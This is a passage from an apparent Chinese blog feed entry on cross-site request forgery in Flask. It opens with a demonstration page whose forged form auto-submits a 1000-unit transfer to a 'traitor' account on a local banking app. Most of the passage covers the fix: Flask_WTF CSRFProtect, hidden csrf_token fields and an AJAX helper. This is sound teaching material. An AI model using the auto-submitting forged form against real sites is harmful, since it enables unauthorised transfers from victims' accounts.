attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>width<span class="token punctuation">=</span>device-width, initial-scale<span class="token punctuation">=</span>1.0<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>X-UA-Compatible<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>ie<span class="token punctuation">=</span>edge<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>Document<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script language-javascript"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://127.0.0.1:5000/transfer/<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>POST<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">'</span>transfer<span class="token punctuation">'</span></span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>table</span><span class="token punctuation">></span></span>         <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span>             <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>转账金额:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>             <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>transfer<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>1000<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>         <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span>         <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span>             <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>转账账户:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>             <span class="token comment" spellcheck="true">&lt;!--- value  值 要是数据库中的真正的账户 --></span>             <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>transfer_name<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>traitor<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>         <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>table</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>box7<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>         <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>确定转入<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">     <span class="token function">$</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>         <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#transfer'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">submit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span> </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里实现了一个和<code>127.0.0.1:5000/transfer/</code> 一样的<code>post</code> 表单,并利用<code>JavaScript</code> 实现了自动点击<code>submit()</code> 提交,实现了自动转账的功能.主要要使用同一个浏览器才能共用<code>cookie</code></p></blockquote><h3 id="4-攻击"><a href="#4-攻击" class="headerlink" title="4.攻击"></a>4.攻击</h3><blockquote><p>在登陆<code>127.0.0.1:5000</code> 的前提下,去访问<code>192.168.0.101:8080</code>网站,它利用了<code>cookie</code> 的原理去攻击<code>127.0.0.1:5000</code> 实现了账户的自动转账给<code>traitor</code> 用户.</p><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/2020-10-14/1602679848546-CSRF.png" alt="csrf"></p></blockquote><h3 id="5-防护"><a href="#5-防护" class="headerlink" title="5.防护"></a>5.防护</h3><blockquote><p><code>Flask</code> 中表单的防护依靠的<code>Flask_WTF</code> ,它的实现是在<code>session in cookie</code> 中添加一个<code>token</code>.</p><p>它的基本原理是:</p><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/2020-10-18/1603021191522-CSRF_1.png" alt="csrf1"></p></blockquote><blockquote><ol><li><code>web server</code> 会给登录的用户生成一个唯一的<code>token</code> 并放置到<code>session</code> 和<code>html</code> 表单中.</li><li>由于是唯一的<code>token</code> ,黑客不能拿到当前用户访问的<code>html</code> 页面的<code>token</code></li><li>黑客伪造的<code>transfer.html</code> 页面,由于没有<code>token</code> ,就算使用了用户的<code>session</code> 也会被服务器丢弃.</li></ol><p><code>Flask</code> 中开启<code>CSRF</code> 防护很简单.参照<code>FLask_WTF</code> <a href="https://flask-wtf.readthedocs.io/en/v0.14.2/csrf.html" target="_blank" rel="noopener">官网</a>只需要2步:</p><ol><li>导入保护模块并绑定<code>app</code></li></ol><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> flask_wtf<span class="token punctuation">.</span>csrf <span class="token keyword">import</span> CSRFProtectcsrf <span class="token operator">=</span> CSRFProtect<span class="token punctuation">(</span>app<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ol start="2"><li><code>html</code> 相关页面中加入<code>token</code> 信息.</li></ol><pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>   <span class="token comment" spellcheck="true">&lt;!-----   实现一个隐藏的input 标签,并出入token  ---></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>csrf_token<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>{{ csrf_token() }}<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>项目中开启<code>app.py</code></p><pre class="line-numbers language-python"><code class="language-python"><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token comment" spellcheck="true"># 开启CSRF防护</span><span class="token keyword">from</span> flask_wtf <span class="token keyword">import</span> CSRFProtectapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>app<span class="token punctuation">.</span>config<span class="token punctuation">.</span>from_object<span class="token punctuation">(</span>config<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 绑定数据库</span>db<span class="token punctuation">.</span>init_app<span class="token punctuation">(</span>app<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 绑定app</span>CSRFProtect<span class="token punctuation">(</span>app<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>base.html</code></p><pre class="line-numbers language-html"><code class="language-html">....  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>{{ csrf_token() }}<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            {% block block_post %}> >             {% endblock %}        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>....<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h3 id="6-使用AJAX-提交数据"><a href="#6-使用AJAX-提交数据" class="headerlink" title="6.使用AJAX 提交数据"></a>6.使用<code>AJAX</code> 提交数据</h3><blockquote><p>在账户登录时,不使用浏览器原生的提交方式,而是使用<code>AJAX</code> 提交数据给后台服务器,并保持网页不跳转.</p><p><code>login.html</code></p><pre class="line-numbers language-html"><code class="language-html">{% extends 'base.html' %}{% block block_title %}>    智商银行登录>   {% endblock %}{% block script %}>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript"><span class="token operator">></span>        <span class="token function">$</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token operator">></span>            <span class="token comment" spellcheck="true">// 阻止点击的默认行为</span><span class="token operator">></span>            <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#btn1'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">click</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span>event<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token operator">></span>                <span class="token comment" spellcheck="true">// 阻止默认行为</span><span class="token operator">></span>                console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">></span>                event<span class="token punctuation">.</span><span class="token function">preventDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">></span>                <span class="token comment" spellcheck="true">// 获取数据</span><span class="token operator">></span>                <span class="token keyword">var</span> Dcsrf_token <span class="token operator">=</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"input[name='csrf_token']"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">val</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">></span>                <span class="token keyword">var</span> Demail <span class="token operator">=</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"input[name='email']"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">val</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">></span>                <span class="token keyword">var</span> Dpassword <span class="token operator">=</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"input[name='password']"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">val</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">></span>                <span class="token keyword">var</span> Dlifetime <span class="token operator">=</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"input[name='lifetime']"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">val</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">></span>                <span class="token comment" spellcheck="true">// javascript object</span><span class="token operator">></span>                <span class="token keyword">var</span> Data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token operator">></span>                    csrf_token<span class="token punctuation">:</span>Dcsrf_token<span class="token punctuation">,</span><span class="token operator">></span>                    email<span class="token punctuation">:</span>Demail<span class="token punctuation">,</span><span class="token operator">></span>                    password<span class="token punctuation">:</span>Dpassword<span class="token punctuation">,</span><span class="token operator">></span>                    lifetime<span class="token punctuation">:</span>Dlifetime<span class="token operator">></span>                <span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token operator">></span>                console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>Data<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">></span>                $<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token operator">></span>                    url<span class="token punctuation">:</span><span class="token punctuation">{</span><span class="token punctuation">{</span> <span class="token function">url_for</span><span class="token punctuation">(</span><span class="token string">'login'</span><span class="token punctuation">)</span> <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token operator">></span>                    data<span class="token punctuation">:</span>Data<span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// 为了表单验证,发送JavaScript object 类型数据</span><span class="token operator">></span>                    success<span class="token punctuation">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token operator">></span>                        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">></span>                    <span class="token punctuation">}</span><span class="token operator">></span>                <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token operator">></span>            <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">></span>        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token operator">></span>    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>>   {% endblock %}{% block block_post %}>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>in_container<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>in_h2<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span><span class="token punctuation">></span></span>登录<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">></span></span>>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>in_box<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>in_img<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/posts/ico-user.png<span class="token punctuation">'</span>) }}<span class="token punctuation">"</span></span> <span class="token attr-name">alt</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>user<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>in_input_1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>email<span class="token punctuation">"</span></span> <span class="token attr-name">placeholder</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>邮箱账户<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>in_box<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>in_img<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/posts/ico-password.png<span class="token punctuation">'</span>) }}<span class="token punctuation">"</span></span> <span class="token attr-name">alt</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>passwd<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>in_input_1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>>                 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span> <span class="token attr-name">placeholder</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>密码<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>in_lifetime<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>>             <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>checkbox<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>lifetime<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>十天免登录<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>十天免登录>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>in_submit<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>登录<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>btn1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>>    {{ info }}>   {% endblock %}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>需要注意的是:要把隐藏的<code>input</code> 标签的<code>value</code> 传递给后台.</p><pre class="line-numbers language-JavaScript">var Dcsrf_token = $(&quot;input[name=&#39;csrf_token&#39;]&quot;).val();</code></pre><p>但是这样还不是最简单的,因为每个有<code>form</code> 表单的页面都需要去手动添加一下<code>csrf-token</code>.参考<code>flask_wtf</code>和<code>ajax</code> 的<a href="https://flask-wtf.readthedocs.io/en/v0.14.2/csrf.html?highlight=ajax#javascript-requests" target="_blank" rel="noopener">结合</a>.</p><p>可以在<code>base.html</code> 中添加<code>meta</code> 标签,用它来获取<code>{{ csrf_token }}</code>,使用这种方法,可以在<code>form</code> 表单中省去写隐藏的<code>input</code> 标签</p><pre><code class="html"><code class="language-JavaScript">var Dcsrf_token = $(&quot;input[name=&#39;csrf_token&#39;]&quot;).val();</code></pre><p>但是这样还不是最简单的,因为每个有<code>form</code> 表单的页面都需要去手动添加一下<code>csrf-token</code>.参考<code>flask_wtf</code>和<code>ajax</code> 的<a href="https://flask-wtf.readthedocs.io/en/v0.14.2/csrf.html?highlight=ajax#javascript-requests" target="_blank" rel="noopener">结合</a>.</p><p>可以在<code>base.html</code> 中添加<code>meta</code> 标签,用它来获取<code>{{ csrf_token }}</code>,使用这种方法,可以在<code>form</code> 表单中省去写隐藏的<code>input</code> 标签</p><pre><code class="html">/*base.html*/<head> <meta charset="UTF-8"> /*添加如下*/ <meta name="csrf-token" content="{{ csrf_token() }}">.... <form action="" method="post"> /* 可以注销隐藏的input标签. */<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>根据以上内容,进一步简写,抽象成一个文件.</p><pre class="line-numbers language-JavaScript"><code class="language-JavaScript">// csrfAjax.js// create JavaScript objectvar csrfAjax={ get: function (args) {     args['type'] = 'GET';     this.ajax(args); }, post: function(args){     args['type'] = 'POST';     this.ajax(args); }, ajax: function (args) {     // 添加csrf_token     this._ajaxSetup();     $.ajax(args); }, _ajaxSetup: function () {     $.ajaxSetup({         beforeSend: function(xhr, settings) {             if (!/^(GET|HEAD|OPTIONS|TRACE)$/i.test(settings.type) && !this.crossDomain) {                 // 获取 csrf_token,                 // 需要注意的是 base.html 必须添加 meta 标签                 var csrf_token = $("meta[name='csrf-token']").attr('content');                 xhr.setRequestHeader("X-CSRFToken", csrf_token);         }     } }); }};<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>login.html</code></p><pre class="line-numbers language-jinja2"><code class="language-jinja2">{% block script %}>    <script src="{{ url_for('static', filename=" js csrfajax.js") }}">>    <script>>        $(function(){>            // 阻止点击的默认行为>            $('#btn1').click(function (event) {>                // 阻止默认行为>                console.log('1');>                event.preventDefault();>                // 获取数据>                // var Dcsrf_token = $("input[name='csrf_token']").val();>                // var Dcsrf_token = $("meta[name='csrf-token']").attr('content');>                var Demail = $("input[name='email']").val();>                var Dpassword = $("input[name='password']").val();>                var Dlifetime = $("input[name='lifetime']").val();>                // javascript object>                var Data = {>                    email:Demail,>                    password:Dpassword,>                    lifetime:Dlifetime>                };>                console.log(Data);>                {#$.post({#}>                {#    url:{{ url_for('login') }},#}>                {#    data:Data, // 为了表单验证,发送JavaScript object 类型数据#}>                {#    success: function (data) {#}>                {#        console.log(data);#}>                {#    }#}>                {# }) #}>                >                {# 使用导入的csrfAjax的方法  #}>                csrfAjax.post({>                    url:{{ url_for('login') }},>                    data:Data, // 为了表单验证,发送JavaScript object 类型数据>                    success: function (data) {>                        console.log(data);>                    }>                })>            });>        })>    </script>>   {% endblock %}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> CSRF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Flask </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>redis订阅发布</title>
      <link href="/posts/9240.html"/>
      <url>/posts/9240.html</url>
      
